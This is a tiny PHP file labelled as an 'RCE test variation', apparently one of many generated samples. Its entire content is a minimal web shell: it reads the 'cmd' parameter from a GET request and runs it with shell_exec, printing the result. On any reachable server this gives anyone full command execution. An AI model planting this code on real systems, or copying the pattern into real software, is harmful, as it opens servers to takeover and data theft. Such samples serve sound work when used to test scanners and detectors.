<?php
// RCE test variation #1314
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>